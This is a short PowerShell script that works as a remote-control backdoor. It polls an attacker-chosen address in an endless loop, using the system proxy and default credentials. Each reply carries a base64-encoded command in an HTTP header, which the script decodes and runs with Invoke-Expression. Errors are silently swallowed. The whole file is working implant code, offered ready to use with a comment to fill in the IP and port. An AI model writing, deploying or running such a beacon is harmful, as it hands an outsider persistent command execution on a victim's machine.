while (1 -eq 1){
try{
# change this to your IP/port
$url = "http://x.x.x.x:8080/hello"
# handle proxies and used default creds if needed
$req = [System.Net.HttpWebRequest]::Create($url);
$p=[System.Net.WebRequest]::GetSystemWebProxy();
$p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;
$req.proxy = $proxy
# add our header
$req.Headers.add('CMD','INITIAL')
$res = $req.GetResponse();
$x = $res.GetResponseHeader("CMD");
# decode base64
$d = [System.Convert]::FromBase64String($x);
$Ds = [System.Text.Encoding]::UTF8.GetString($d);
# exec whatever we gave it (can be powershell or just shell commands)
invoke-expression $Ds;
$res.Close();
}catch{}
}
